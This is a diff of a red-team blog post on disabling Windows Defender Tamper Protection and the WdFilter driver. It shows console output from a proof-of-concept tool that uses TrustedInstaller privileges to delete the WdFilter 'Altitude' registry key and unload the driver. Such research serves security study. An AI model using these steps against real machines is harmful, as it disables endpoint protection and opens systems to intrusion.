@@ -1,6 +1,6 @@
 ---
 title: Disabling Tamper Protection and other components of Defender / MDE
-date: 2024-04-05 09:48:47 +07:00
+date: 2024-04-08 09:48:47 +07:00
 categories: RedTeaming
 #modified: 20-08-29 09:24:47 +07:00
 #tags: [blog, netlify, jekyll, github]
@@ -210,10 +210,10 @@ An example, to use this POC is as follows:
 
 ```
 C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
-[+] WdFilter Altitude Registry key Value: (null)
+[+] WdFilter Altitude Registry key Value: 328010
 [+] Trusted Installer handle: 0000000000000120
 [!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
-[+] Created process ID: 4192 and assigned additional token privileges.
+[+] Created process ID: 3744 and assigned additional token privileges.
 [+] Execute option 1 to validate!
 
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
@@ -223,7 +223,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] Restart the system or wait a few minutes for WdFilter to unload.
 [+] Execute option 1 to validate!
 
-# Restart or wait a few minutes for WdFilter to automatically unload
+# Restart (or wait a few minutes) to crash and unload WdFilter
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
